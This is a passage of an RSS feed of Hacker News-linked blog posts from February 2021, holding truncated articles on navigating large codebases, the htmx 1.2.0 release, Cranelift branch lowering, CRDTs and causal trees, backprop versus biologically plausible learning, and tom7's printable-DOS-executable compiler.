due to all the pain surrounding the tools that we have to deal with on a daily basis.
Large projects ensure that not only is the documentation hard to write, it‚Äôs also
impossible to find and read due to the sheer number of documents [4].</p><h2 id="tackling-the-beast">Tackling the beast</h2><p>In this section I will describe my ways of tackling the problems of an unknown large codebase
that I often encounter in the wild.
As mentioned before, the main problem of large systems is that nobody can understand them
entirely and often you will be left wondering how the damn thing even works.</p><p>When you are trying to understand a specific part of a large system, it‚Äôs worth
taking the time to talk to the current maintainers. They usually know it well enough
to guide you through the jungle, so you can avoid the traps and get up to speed faster.
Sometimes you will encounter a situation where you will just have to figure it
out on your own, because nobody will have the answers to your questions.</p><p>Hopefully the following sections might give you some ideas on how to tackle such
situations.</p><h3 id="read-the-documentation">Read the documentation</h3><p>The easiest way to get familiar with a large system, is by going through its documentation and
actually reading it. Large systems usually contain
large swaths of outdated documentation, but even a slightly outdated document is
often better than not having it at all. Ask the elders about the current state of documentation,
so you don‚Äôt completely waste your time with deciphering the irrelevant documents.</p><p>Either way, the documentation will only give you an overview of the system. The details
behind design decisions are almost never mentioned and you will have to find another way.</p><h3 id="check-the-tests">Check the tests</h3><p>When I am trying to decipher how a specific part of the system is supposed to behave,
I usually check for tests. If they exist, you might want to scroll through them and hopefully
you will get another ‚Ä¶</p></div></div>
<br/><p><em>Article truncated for RSS feed. Read the full article at <a href="https://blog.royalsloth.eu/posts/on-navigating-a-large-codebase/">https://blog.royalsloth.eu/posts/on-navigating-a-large-codebase/</a></em></p>]]>
            </description>
            <link>https://blog.royalsloth.eu/posts/on-navigating-a-large-codebase/</link>
            <guid isPermaLink="false">hacker-news-small-sites-26129190</guid>
            <pubDate>Sun, 14 Feb 2021 02:41:49 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Htmx 1.2.0 Release]]>
            </title>
            <description>
<![CDATA[
Score 136 | Comments 25 (<a href="https://news.ycombinator.com/item?id=26128229">thread link</a>) | @crbelaus
<br/>
February 13, 2021 | https://htmx.org/posts/2021-2-13-htmx-1.2.0-is-released/ | <a href="https://web.archive.org/web/*/https://htmx.org/posts/2021-2-13-htmx-1.2.0-is-released/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div>
    <h2>htmx 1.2.0 Release</h2>
<p>I'm happy to announce the <a href="https://unpkg.com/browse/htmx.org@1.2.0/">1.2.0 release</a> of htmx.</p>
<h3>New Features &amp; Major Changes</h3>
<ul>
<li><code>hx-vars</code> has been deprecated in favor of <code>hx-vals</code></li>
<li><code>hx-vals</code> now supports a <code>javascript:</code> prefix to achieve the behavior that <code>hx-vars</code> provided</li>
<li>The new <code>hx-headers</code> attribute allows you to add headers to a request via an attribute.  Like <code>hx-vals</code> it supports
JSON or javascript via the <code>javascript:</code> prefix</li>
<li><code>hx-include</code> will now include all inputs under an element, even if that element is not a form tag</li>
<li>The <a href="https://htmx.org/extensions/preload/">preload extension</a> now offers a <code>preload-images="true"</code> attribute that will aggressively load images in preloaded content</li>
<li>On requests driven by a history cache miss, the new <code>HX-History-Restore-Request</code> header is included so that the server
can differentiate between history requests and normal requests</li>
</ul>
<h3>Improvements &amp; Bug fixes</h3>
<ul>
<li>Improved handling of precedence of input values to favor the enclosing form (see <a href="https://github.com/bigskysoftware/htmx/commit/a10e43d619dc340aa324d37772c06a69a2f47ec9">here</a>)</li>
<li>Moved event filtering logic <em>after</em> <code>preventDefault</code> so filtering still allows events to be properly handled</li>
<li>No longer trigger after swap events on elements that have been removed via an <code>outerHTML</code> swap</li>
<li>Properly remove event handlers added to other elements when an element is removed from the DOM</li>
<li>Handle the <code>scroll:</code> modifier in <code>hx-swap</code> properly when an <code>outerHTML</code> swap occurs</li>
<li>Lots of docs fixes</li>
</ul>
<p>Enjoy!</p>

</div></div>]]>
            </description>
            <link>https://htmx.org/posts/2021-2-13-htmx-1.2.0-is-released/</link>
            <guid isPermaLink="false">hacker-news-small-sites-26128229</guid>
            <pubDate>Sat, 13 Feb 2021 23:51:45 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Cranelift, Part 2: Compiler Efficiency, CFGs, and a Branch Peephole Optimizer]]>
            </title>
            <description>
<![CDATA[
Score 13 | Comments 0 (<a href="https://news.ycombinator.com/item?id=26127665">thread link</a>) | @PoignardAzur
<br/>
February 13, 2021 | https://cfallin.org/blog/2021/01/22/cranelift-isel-2/ | <a href="https://web.archive.org/web/*/https://cfallin.org/blog/2021/01/22/cranelift-isel-2/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div aria-label="Content">
      <div>
        <article itemscope="" itemtype="http://schema.org/BlogPosting">

  

  <div itemprop="articleBody">
    <p>This post is the second in a three-part series about
<a href="https://github.com/bytecodealliance/wasmtime/tree/main/cranelift">Cranelift</a>.
In the <a href="https://cfallin.org/blog/2020/09/18/cranelift-isel-1/">first post</a>, I
described the context around Cranelift and our project to replace its
backend code-generation infrastructure, and detailed the
instruction-selection problem and how we solve it. The remaining two
posts will be deep-dives into some interesting engineering problems.</p>

<p>In this post, I want to dive into the <em>compiler performance</em> aspect of
our work more deeply. (In the next post we‚Äôll explore correctness.)
There are many interesting aspects of compilation speed I could talk
about, but one particularly difficult problem is the handling of
<em>control flow</em>: how do we translate structured control flow at the
Wasm level into control-flow graphs at the IR level, and finally to
branches in a linear stream of instructions at the machine-code level?</p>

<p>Doing this translation efficiently requires careful attention to the
overall pass structure, with the largest wins coming when one can
completely eliminate a category of work. We‚Äôll see this in how we
combine several passes in a traditional lowering design (critical-edge
splitting, block ordering, redundant-block elimination, branch
relaxation, branch target resolution) into <em>inline transforms</em> that
happen during other passes (lowering of the CLIF, or Cranelift IR,
into machine-specific IR; and later, binary emission).</p>

<p>This post basically describes the
<a href="https://github.com/bytecodealliance/wasmtime/blob/main/cranelift/codegen/src/machinst/buffer.rs"><code>MachBuffer</code></a>,
a ‚Äúsmart machine-code buffer‚Äù that knows about branches and edits them
on-the-fly as we emit them, and the
<a href="https://github.com/bytecodealliance/wasmtime/blob/main/cranelift/codegen/src/machinst/blockorder.rs"><code>BlockLoweringOrder</code></a>,
which allows us to lower code in final basic-block order, with split
critical edges inserted implicitly, by traversing a never-materialized
implicit graph. The work was done mostly in <a href="https://github.com/bytecodealliance/wasmtime/pull/1718">Cranelift PR
#1718</a>, which
resulted in a ~10% compile-time improvement and a ~25%
compile+run-time improvement on a CPU-intensive benchmark (<code>bz2</code>).</p>

<h2 id="control-flow-graphs">Control-Flow Graphs</h2>

<p>Before we discuss any of that, we need to review control-flow graphs
(CFGs)! The CFG is a fundamental data structure used in almost all
modern compilers. In brief, it represents how execution (i.e., program
control) may flow through instructions, using graph nodes to represent
linear sequences of instructions and graph edges to represent all
possible control-flow transfers at branch instructions.</p>

<p>At the end of the instruction selection process, which we learned
about in the <a href="https://cfallin.org/blog/2020/09/18/cranelift-isel-1/">previous post</a>, we have a function body lowered into VCode that consists of
<a href="https://en.wikipedia.org/wiki/Basic_block"><em>basic blocks</em></a>. A basic
block is a contiguous sequence of instructions that has no outbound
branches except at the end, and has no inbound branches except at the
beginning. In other words, it is ‚Äústraight-line‚Äù code: execution
always starts at the top and proceeds to the end. An example
control-flow graph (CFG) consisting of four basic blocks is shown
below:</p>

<p><img src="https://cfallin.org/assets/2020-10-08-cfg-web.svg" alt="Figure: Control-flow graph with four basic blocks in a diamond"></p>

<p>Control-flow graphs are excellent data structures for compilers to
use. By making the flow of execution explicit as graph edges, rather
than reasoning about instructions in order in memory as the processor
sees them, many analyses can be performed more easily. For example,
<a href="https://en.wikipedia.org/wiki/Data-flow_analysis">dataflow analysis</a>
problems can be solved easily because the CFG makes traversal of
possible control-flow transfers easy. Graph-based representations of
the program also allow easier <em>moving and insertion of code</em>: it is
less error-prone to manipulate an explicit graph than to reason about
implicit control-flow (e.g. fallthrough from a not-taken conditional
branch). Finally, the graph representation factors out the question of
<em>block ordering</em>, which can be important for performance; we can
address this problem separately by choosing how we serialize the graph
nodes (blocks). For these reasons, most compiler IRs, including
Cranelift‚Äôs CLIF and <code>VCode</code>, are CFG-based.</p>

<p>(Historical note: control-flow graphs were invented by the late
<a href="https://en.wikipedia.org/wiki/Frances_Allen">Frances Allen</a>, who
largely established the algorithmic foundations that modern compilers
use. Her paper <a href="https://www.clear.rice.edu/comp512/Lectures/Papers/1971-allen-catalog.pdf">A catalogue of optimizing
transformations</a><sup id="fnref:1" role="doc-noteref"><a href="#fn:1">1</a></sup>
covers essentially all of the important optimizations used today and
is well worth a read.)</p>

<h2 id="cpus-and-branch-instructions">CPUs and Branch Instructions</h2>

<p>To represent a CFG‚Äôs end-of-block branches at the instruction level,
we can use <em>two-way branches</em>: these are instructions that branch
either to one basic-block target if some condition is true, or another
if the condition is false. (Basic blocks can also end in simple
unconditional single-target branches.) We wrote such a branch as <code>if
r0, L1, L2</code> above; this means that the block <code>L0</code> will be followed in
execution either by <code>L1</code> or <code>L2</code>, depending on the value in <code>r0</code>.<sup id="fnref:2" role="doc-noteref"><a href="#fn:2">2</a></sup></p>

<h3 id="branches-with-fallthrough">Branches with Fallthrough</h3>

<p>However, CPUs rarely have such two-way branch instructions. Instead,
conditional control-flow in common ISAs is almost always provided with
a <em>conditional branch with fallthrough</em>. This is an instruction that,
if some condition is true, branches to another location; otherwise,
does nothing, and allows execution to continue sequentially. This is a
better fit for a hardware implementation for a number of reasons: it‚Äôs
easier to encode one target than two (the destination of the jump
might be quite far away for some branches, and instructions have
limited bits available), and it‚Äôs usually the case that the compiler
can place one of the successor blocks immediately afterward anyway.</p>

<p>Now, this isn‚Äôt much of a problem if we just want a working compiler;
instead of a two-way branch</p>



<p>We can write a sequence of branches</p>



<p>where <code>br_if</code> branches to <code>L1</code> or falls through to the unconditional
<code>goto</code>. But this is not so efficient in many cases. Consider what
would happen if we laid out basic blocks in the order <code>L0</code>, <code>L2</code>,
<code>L1</code>, <code>L3</code>:</p>

<div><div><pre><code>    L0:
      ...
      br_if r0, L1
      goto L2
    L2:
      ...
      goto L3
    L1:
      ...
      goto L3
    L3:
      ...
      return
</code></pre></div></div>

<p>There are two redundant unconditional branches (<code>goto</code> instructions),
each of which uselessly branches to the following instruction. We can
remove both of them with no ill effects, taking advantage instead of
<em>fallthrough</em>, or allowing execution to proceed directly from the end
of one block to the start of the next one:</p>

<div><div><pre><code>    L0:
      ...
      br_if r0, L1
      // ** Otherwise, fall through to L2 **
    L2:
      ...
      goto L3
    L1:
      ...
      // ** Always fall through to L3 **
    L3:
      ...
      return
</code></pre></div></div>

<p>This seems like an easy enough problem to solve: we just need to
recognize when a branch is redundant and remove it, right? Well, yes,
but we can do much better than that in some cases; we‚Äôll dig into this
problem in significantly more depth below!</p>

<h3 id="machine-code-encoding-branch-offsets">Machine-code Encoding: Branch Offsets</h3>

<p>So far, we‚Äôve written our machine instructions in a way that humans
can read, using <em>labels</em> to refer to locations in the instruction
stream. At the hardware level, however, these labels do not exist;
instead, the machine code branches contain target <em>addresses</em> (usually
encoded as relative <em>offsets</em> from the branch instruction). In other
words, we do not see <code>goto L3</code>, but rather <code>goto +32</code>.</p>

<p>This gives rise to several complications when emitting machine code
from a list of instruction <code>struct</code>s.  At the most basic level, we
have to resolve labels to offsets and then patch the branches
appropriately. This is analogous to (but at a lower level than) the
job of a <a href="https://en.wikipedia.org/wiki/Linker_(computing)">linker</a>:
we resolve symbols to concrete values after deciding placement, and
then edit the code according to <em>relocations</em> to refer to those
symbols. In other words, whenever we emit a branch, we make a note (a
relocation, or ‚Äúlabel use‚Äù in our <code>MachBackend</code>) to go back later and
patch it with the resolved label offset.</p>

<p>The second, and more interesting, problem arises because not all
branch instructions can necessarily refer to all possible labels! As a
concrete example, on AArch64, conditional branches have a ¬±1 MB range,
and unconditional branches have a ¬±128 MB range. This arises out of
instruction-encoding considerations: particularly in
fixed-instruction-size ISAs (such as ARM, MIPS, and RISC V), less than
a full machine word of bits are available for the immediate jump
offset that is embedded in the instruction word. (The instruction
itself is always a machine-word wide, and we need some bits for the
opcode and condition code too!) On x86, we have limits for a different
reason: the variable-width encoding allows either a one-byte offset
(allowing a ¬±128 byte range) or four-byte offset (allowing a ¬±2 GB
range).</p>

<p>To make a branch to a far-off label, then, on some machines we need to
either use a different sort of branch than the default choice for the
instruction selector, or we need to use a form of <em>indirection</em>, by
targetting the original branch to <em>another branch</em>, the latter in a
special form. The former is tricky because we do not know whether a
target will be in-range until all code is lowered and placement is
computed; so we need to either optimistically or pessimistically lower
branches to the shortest or longest form (respectively) and possibly
switch later. To make matters worse, as we edit branches to use a
shorter or longer form, their length may change, moving <em>other</em>
targets into or out of range; in the most general solution, this is a
‚Äúfixpoint problem‚Äù, where we iterate until no more changes occur.</p>

<h2 id="challenges-in-lowering-cfgs-to-machine-code">Challenges in Lowering CFGs to Machine Code</h2>

<p>So far, we have a way to produce <em>correct</em> machine code. To emit the
final code for a two-target branch, we can emit a conditional-
followed by unconditional-branch machine instruction. To resolve
branch targets correctly, we can assume that any target could be
anywhere in memory, and always use the long form of a branch; then we
just need to come back in one final pass and fill in the offsets when
we know them.</p>

<p>We can do much better than this, though! Below I‚Äôll describe four
problems and the ways that they are traditionally solved.</p>

<h3 id="problem-1-efficient-use-of-fallthroughs">Problem 1: Efficient use of Fallthroughs</h3>

<p>We described above how <em>branch fallthroughs</em> allow us to omit some
some unconditional branches once we know for sure the order that basic
blocks will appear in the final binary. In ‚Ä¶</p></div></article></div></div></div>
<br/><p><em>Article truncated for RSS feed. Read the full article at <a href="https://cfallin.org/blog/2021/01/22/cranelift-isel-2/">https://cfallin.org/blog/2021/01/22/cranelift-isel-2/</a></em></p>]]>
            </description>
            <link>https://cfallin.org/blog/2021/01/22/cranelift-isel-2/</link>
            <guid isPermaLink="false">hacker-news-small-sites-26127665</guid>
            <pubDate>Sat, 13 Feb 2021 22:37:56 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Data Laced with History: Causal Trees and Operational CRDTs (2018)]]>
            </title>
            <description>
<![CDATA[
Score 103 | Comments 10 (<a href="https://news.ycombinator.com/item?id=26127570">thread link</a>) | @mcovalt
<br/>
February 13, 2021 | http://archagon.net/blog/2018/03/24/data-laced-with-history/ | <a href="https://web.archive.org/web/*/http://archagon.net/blog/2018/03/24/data-laced-with-history/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div>

<div id="sel_blog20180324data-laced-with-history">
<div>



<article>


<p><img src="http://archagon.net/images/blog/causal-trees/header.jpg"></p>

<p>Hello! This article took a while to cobble together. If you find it useful, please consider leaving a donation via <a href="https://donorbox.org/crdt-article"> </a>, <a href="https://www.buymeacoffee.com/archagon"> </a>, or <a href="ethereum:0x0d5dd8a8Cca8Bf7d0122F7A1Cc76c6b0666fCC56"> </a>. (Thought I'd try something new!) Or, just buy yourself a nice Roost through my <a href="http://amzn.to/2D7uYxz"> </a>. Donation or not, thank you for reading! üòä</p>

<p>(Sorry about the length! At some point in the distant past, this was supposed to be a short blog post. If you like, you can skip straight to the <a href="#demo-concurrent-editing-in-macos-and-ios">demo section</a> to get a sense of what this article is about.)</p>

<p>Embarrassingly, most of my app development to date has been confined to local devices. Programmers like to gloat about the stupendous mental castles they build of their circuitous, multi-level architectures, but not me. In truth, networks leave me quite perplexed. I start thinking about data serializing to bits, servers performing their arcane handshakes and voting rituals, merge conflicts pushing into app-space and starting the whole process over again‚Äîand it all just turns to mush in my head. For peace of mind, my code needs to be <em>locally provable</em>, and this means things like idempotent functions, decoupled modules, contiguous data structures, immutable objects. Networks, unfortunately, throw a giant wrench in the works.</p>

<p>Sometime last year, after realizing that most of my document-based apps would probably need to support sync and collaboration in the future, I decided to finally take a stab at the problem. Granted, there were tons of frameworks that promised to do the hard work of data model replication for me, but I didn‚Äôt want to black-box the most important part of my code. My gut told me that there had to be some arcane bit of foundational knowledge that would allow me to sync my documents in a refined and functional way, decoupled from the stateful spaghetti of the underlying network layer. Instead of downloading a Github framework and <a href="http://amzn.to/2iigBOI">smacking the build button</a>, I wanted to develop a base set of skills that would allow me to easily network <em>any</em> document-based app in the future, even if I was starting from scratch.</p>

<!--more-->

<p>The first order of business was to devise a wishlist for my fantastical system:</p>

<ul>
  <li>Most obviously, users should be able to edit their documents immediately, without even touching the network. (In other words, the system should only require <em>optimistic concurrency</em>.)</li>
  <li>Sync should happen in the background, entirely separate from the main application code, and any remote changes should be seamlessly integrated in real-time. (The user shouldn‚Äôt have to notice that the network is down.)</li>
  <li>Merge should always be automatic, even for concurrent edits. The user should never be faced with a ‚Äúpick the correct revision‚Äù dialog box.</li>
  <li>A user should be able to work on their document offline for an indefinite period of time without accruing ‚Äúsync debt‚Äù. (Meaning that if, for example, sync is accomplished by sending out mutation events, performance should not suffer even if the user spends a month offline and then sends all their hundreds of changes at once.)</li>
  <li>Secondary data structures and state should be minimized. Most of the extra information required for sync should be stored in the same place as the document, and moving the document to a new device should not break sync. (No out-of-band metadata or caches!)</li>
  <li>Network back-and-forth should be condensed to a bare minimum, and rollbacks and re-syncs should practically never happen. To the greatest possible degree, network communication should be stateless and dumb.</li>
  <li>To top it all off, my chosen technique had to pass the ‚ÄúPhD Test‚Äù. That is to say, one shouldn‚Äôt need a PhD to understand and implement the chosen approach for custom data models!</li>
</ul>

<p>After mulling over my bullet points, it occurred to me that the network problems I was dealing with‚Äîbackground cloud sync, editing across multiple devices, real-time collaboration, offline support, and reconciliation of distant or conflicting revisions‚Äîwere all pointing to the same question: was it possible to design a system where any two revisions of the same document could be merged deterministically and sensibly without requiring user intervention? Sync, per se, wasn‚Äôt the issue, since getting data from one device to another was essentially a solved problem. It‚Äôs what happened <em>after</em> sync that was troubling. On encountering a merge conflict, you‚Äôd be thrown into a busy conversation between the network, model, persistence, and UI layers just to get back into a consistent state. The data couldn‚Äôt be left alone to live its peaceful, functional life: every concurrent edit immediately became a cross-architectural matter. On the other hand, if two documents could always be made to merge, then most of that coordination hullabaloo could go out the window. Each part of the system could be made to work at its own pace.</p>

<p>Whether stored as a record in a database or as a stand-alone file, a document could be interpreted as a collection of basic data fields: registers, sequences, dictionaries, and so forth. Looking at the problem from a database perspective, it was actually quite simple to automatically resolve merge conflicts in this kind of table row: just keep overwriting each field with the version sporting the highest timestamp, <a href="https://en.wikipedia.org/wiki/Lamport_timestamps">logical</a> or otherwise. (Ignoring issues of inter-field consistency for now.) Of course, for anything other than basic registers, this was a terrible approach. Sequences and dictionaries weren‚Äôt just blobs of homogeneous data that were overwritten with every change, but complex, mutable structures that users were editing on a granular level. For such a fundamental problem, there was a surprising dearth of solutions out in the real world: most systems punted the task to app-space by asking the client to manually fix any merge conflicts or pick the correct version of a file. It seemed that if the problem of automatic merge for non-trivial data types could be solved‚Äîperhaps by exposing their local, type-specific mutation vocabulary to the storage and replication layers?‚Äîthen a solution to the higher-level problem of automatic document merge would fall within reach.</p>

<p>In hope of uncovering some prior art, I started by looking at the proven leader in the field, Google Docs. Venturing down the deep rabbit hole of <a href="https://en.wikipedia.org/wiki/Collaborative_real-time_editor">real-time collaborative editing</a> techniques, I discovered that many of the problems I faced fell under the umbrella of <a href="https://en.wikipedia.org/wiki/Eventual_consistency">strong eventual consistency</a>. Unlike the more conventional <a href="https://en.wikipedia.org/wiki/Strong_consistency">strong consistency</a> model, where all clients receive changes in identical order and rely on locking to some degree, strong <em>eventual</em> consistency allows clients to individually diverge and then arrive at a final, consistent result once each update has been received. (Or, in a word, when the network is <em>quiescent</em>.)</p>

<p>There were a number of tantalizing techniques to investigate, and I kept several questions in mind while doing my analysis. Could a given technique be generalized to arbitrary and novel data types? Did the technique pass the PhD Test? And was it possible to use the technique in an architecture with smart clients and dumb servers?</p>

<p>The reason for that last question was CloudKit Sharing, a framework introduced in iOS 10. For the most part, this framework functioned as a superset of regular CloudKit, requiring only minor code changes to enable document sharing in an app. A developer didn‚Äôt even have to worry about connecting users or dealing with UI: Apple did most of the hard work in the background while leveraging standard system dialogs. But almost two years later, <a href="https://github.com/search?l=Swift&amp;q=UICloudSharingController&amp;type=Code&amp;utf8=%E2%9C%93">on the order of no one</a> seemed to be using it. Why was this? Most other Apple APIs tended to be readily adopted, especially when they allowed the developer to expand into system areas which were normally out of bounds.</p>

<p>My hunch was that CloudKit Sharing forced the issue of real-time collaboration over a relatively dumb channel, which was a task outside the purview of conventional sync approaches. CloudKit allowed developers to easily store, retrieve, and listen for new data, but not much else besides. No third-party code was allowed to run on Apple‚Äôs servers, so merge conflicts had to be handled locally. But unlike in the single-user case, which presented limited opportunities for concurrent edits, you couldn‚Äôt just pop up a merge dialog every time another participant in your share made a change to your open document. The only remaining options seemed to be some sort of ugly, heuristic auto-merge or data-dropping last-write-wins, neither of which was acceptable for real-time use. Collaboration along the lines of Google Docs appeared to be impossible using this system! But was it really?</p>

<p>I realized that this was my prize to be won. If I could figure out a way to develop auto-merging documents, I‚Äôd be able to implement sync and collaboration in my apps over CloudKit while using Apple‚Äôs first-party sharing UI‚Äîall without having to pay for or manage my own servers. So this became my ultimate research goal: a collaborative iPhone text editing demo that synced entirely over CloudKit. (And here‚Äôs a spoiler: <a href="#demo-concurrent-editing-in-macos-and-ios">it worked!</a>)</p>





<p>There are a few basic terms critical to understanding eventual consistency. A network is comprised of <em>sites</em> (‚Äúdevices‚Äù, ‚Äúpeers‚Äù) operating in parallel, each one producing <em>operations</em> (‚Äúevents‚Äù, ‚Äúactions‚Äù) that mutate the data and exchange information with other sites. The first vital concept here is <strong>causality</strong>. An operation is <em>caused</em> by another operation when it directly modifies or otherwise involves the results of that operation, and determining causality is critical to reconstructing a sensible timeline (or <strong>linearization</strong>) of operations across the network. (An operation that <em>causes</em> another operation must always be ordered first.) However, we can‚Äôt always determine direct causality in a general way, so algorithms often assume that an operation is causally ahead of another one if the site generating the newer operation has already seen the older one at the time of its creation. (In other words, every operation already seen by a site at the time a new operation is created is in that operation‚Äôs <em>caus‚Ä¶</em></p></article></div></div></div></div>
<br/><p><em>Article truncated for RSS feed. Read the full article at <a href="http://archagon.net/blog/2018/03/24/data-laced-with-history/">http://archagon.net/blog/2018/03/24/data-laced-with-history/</a></em></p>]]>
            </description>
            <link>http://archagon.net/blog/2018/03/24/data-laced-with-history/</link>
            <guid isPermaLink="false">hacker-news-small-sites-26127570</guid>
            <pubDate>Sat, 13 Feb 2021 22:25:05 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Don't Mess with Backprop: Doubts about Biologically Plausible Deep Learning]]>
            </title>
            <description>
<![CDATA[
Score 6 | Comments 0 (<a href="https://news.ycombinator.com/item?id=26127387">thread link</a>) | @ericjang
<br/>
February 13, 2021 | https://blog.evjang.com/2021/02/backprop.html | <a href="https://web.archive.org/web/*/https://blog.evjang.com/2021/02/backprop.html">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div id="post-body-4236921617169203700" itemprop="description articleBody">
<p>Biologically Plausible Deep Learning (BPDL) is an active research field at the intersection of Neuroscience and Machine Learning, studying how we can train deep neural networks with a "learning rule" that could conceivably be implemented in the brain.</p><p>The line of reasoning that typically motivates BPDL is as follows:</p><ol><li>A Deep Neural Network (DNN) can learn to&nbsp;perform perception tasks that biological brains are capable of (such as detecting and recognizing objects).</li><li>If activation units and their weights are to DNNs as&nbsp;what neurons and synapses are to biological brains, then what is <a href="https://en.wikipedia.org/wiki/Backpropagation">backprop </a>(the primary method for training deep neural nets) analogous to?</li><li>If learning rules in brains are not implemented using backprop, then how are they implemented? How can we achieve similar performance to backprop-based update rules while still respecting biological constraints?</li></ol><p>A nice overview of the ways in which backprop is not biologically plausible can be found <a href="https://psychology.stackexchange.com/questions/16269/is-back-prop-biologically-plausible">here</a>, along with various algorithms that propose fixes.</p><p>My somewhat contrarian opinion is that designing biologically plausible alternatives to backprop is the wrong question to be asking. The motivating premises of BPDL makes a faulty assumption: that <b>layer activations are neurons and weights are synapses, and therefore learning-via-backprop must have a counterpart or alternative in biological learning.</b></p><p>Despite the name and their impressive capabilities on various tasks, DNNs actually have very little to do with biological neural networks. One of the great errors in the field of Machine Learning is that we ascribe too much biological&nbsp; meaning to our statistical tools and optimal control algorithms. It leads to confusion from newcomers, who ascribe entirely different meaning to "learning", "evolutionary algorithms", and so on.</p><p>DNNs are a sequence of linear operations interspersed with nonlinear operations, applied sequentially to real-valued inputs - nothing more. They are optimized via gradient descent, and gradients are computed efficiently using a dynamic programming scheme known as backprop. Note that I didn't use the word "learning"!</p><p>Dynamic programming is the ninth wonder of the world<span>1</span>, and in my opinion one of the top three achievements of Computer Science. Backprop has linear time-complexity in network depth, which makes it extraordinarily hard to beat from a computational cost perspective. Many BPDL algorithms often don't do better than backprop, because they try to take an efficient optimization scheme and shoehorn in an update mechanism with additional constraints.&nbsp;</p><p>If the goal is to build a biologically plausible learning mechanism, there's no reason that units in Deep Neural Networks should be one-to-one with biological neurons. Trying to emulate a DNN with models of biologically neurons feels backwards; like trying to emulate the Windows OS with a human brain. It's hard and a human brain can't simulate Windows well.</p><p>Instead, let's do the emulation the other way around: optimizing a function approximator to&nbsp;implement a biologically plausible learning rule. The recipe is straightforward:</p><ol><li>Build a biological plausible model of a neural network with model neurons and synaptic connections. Neurons communicate with each other using spike trains, rate coding, or gradients, and respect whatever constraints you deem to be "sufficiently biologically plausible". It has parameters that need to be trained.</li><li>Use computer-aided search to design a biologically plausible learning rule for these model neurons. For instance, each neuron's feedforward behavior and local update rules can be modeled as a decision from an artificial neural network.</li><li>Update the function approximator so that the biological model produces the desired learning behavior. We could train the neural networks via backprop.&nbsp;</li></ol><p>The choice of function approximator we use to find our learning rule is irrelevant - what we care about at the end of the day is answering how a biological brain is able to learn hard tasks like perception, while respecting known constraints like the fact that biological neurons don't store all activations in memory or only employ local learning rules. We should leverage Deep Learning's ability to find good function approximators, and direct that towards finding a good biological learning rules.</p><p>The insight that we should&nbsp;<i>(artificially)&nbsp;learn to (biologically) learn</i>&nbsp;is not a new idea, but it is one that I think is not yet obvious to the neuroscience + AI community. <a href="https://en.wikipedia.org/wiki/Meta_learning_(computer_science)">Meta-Learning</a>, or "Learning to Learn",&nbsp;is a field that has emerged in recent years, which formulates the act of acquiring a system capable of performing learning behavior (potentially superior to gradient descent). If meta-learning can find us more <a href="https://arxiv.org/pdf/1703.05175.pdf">sample efficient</a> or <a href="https://arxiv.org/abs/1904.07392">superior</a>&nbsp;or <a href="https://arxiv.org/pdf/1906.03367.pdf">robust</a>&nbsp;learners, why can't it find us rules that respect biological learning constraints? Indeed, recent work [<a href="https://arxiv.org/pdf/2006.09549.pdf">1</a>, <a href="https://www.biorxiv.org/content/10.1101/2019.12.30.891184v1.full.pdf">2</a>, <a href="https://arxiv.org/pdf/2012.03837.pdf">3</a>, <a href="https://arxiv.org/abs/1608.05343">4</a>, <a href="http://proceedings.mlr.press/v119/real20a/real20a.pdf">5</a>] shows this to be the case. You can indeed use backprop to train a separate learning rule superior to na√Øve backprop.</p><p>I think the reason that many researchers have not really caught onto this idea (that we should emulate biologically plausible circuits with a meta-learning approach) is that until recently, compute power wasn't quite strong enough to both train a meta-learner and a learner. It still requires substantial computing power and research infrastructure to set up a meta-optimization scheme, but tools like <a href="https://blog.evjang.com/2019/02/maml-jax.html">JAX make it considerably easier now</a>.</p><p>A true biology purist might argue that finding a learning rule using gradient descent and backprop is not an "evolutionarily plausible learning rule", because evolution clearly lacks the ability to perform dynamic programming or even gradient computation. But this can be amended by making the meta-learner evolutionarily plausible. For instance, the mechanism with which we select good function approximators does not need rely on backprop at all. Alternatively, we could formulate a meta-meta problem whereby the selection process itself obeys rules of evolutionary selection, but the selection process is found using, once again, backprop.</p><p>Don't mess with backprop!</p><p><b>Footnotes</b></p><p>[1] The eighth wonder being, of course, <a href="https://www.listenmoneymatters.com/compound-interest/">compound interest</a>.</p>

</div></div>]]>
            </description>
            <link>https://blog.evjang.com/2021/02/backprop.html</link>
            <guid isPermaLink="false">hacker-news-small-sites-26127387</guid>
            <pubDate>Sat, 13 Feb 2021 22:01:17 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[C compiler for producing completely printable DOS executables]]>
            </title>
            <description>
<![CDATA[
Score 16 | Comments 3 (<a href="https://news.ycombinator.com/item?id=26127161">thread link</a>) | @jstrieb
<br/>
February 13, 2021 | http://tom7.org/abc/ | <a href="https://web.archive.org/web/*/http://tom7.org/abc/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div><div>
<p>
ZM~~&nbsp;#&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;PRinty#&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;C&nbsp;with&nbsp;ABC!
</p>

<p>Hi! For <a href="http://sigbovik.org/2016/">SIGBOVIK 2017</a>, I created a strange <a href="http://tom7.org/abc/paper.pdf">paper</a>. This one may be a bit impenetrable for non computer scientists. If you have the time, I think reading the paper is the best way to experience it. But I also created the following video that explains the ideas involved, for interested non-experts or patient experts. It's long, at about 25 minutes, but you can always just skip to the end:

<iframe width="853" height="480" src="https://www.youtube.com/embed/LA_DrBwkiJA" frameborder="0" allowfullscreen=""></iframe>

</p><p>The paper in raw form is available as <a href="http://tom7.org/abc/paper.exe">PAPER.EXE</a> or <a href="http://tom7.org/abc/paper.txt">PAPER.TXT</a> (same file). Due to unreasonable SIGBOVIK deadlines, it's been updated a little compared to the version that appeared in SIGBOVIK 2017 (<a href="http://tom7.org/abc/abc.bib">bibtex</a>).

</p><p>The source code I used to create the paper is <a href="http://sourceforge.net/p/tom7misc/svn/HEAD/tree/trunk/abc/">here</a>.</p>

<p>Please leave a comment <a href="http://radar.spacebar.org/">on my blog</a> or on Twitter at <a href="http://twitter.com/tom7">@tom7</a>!
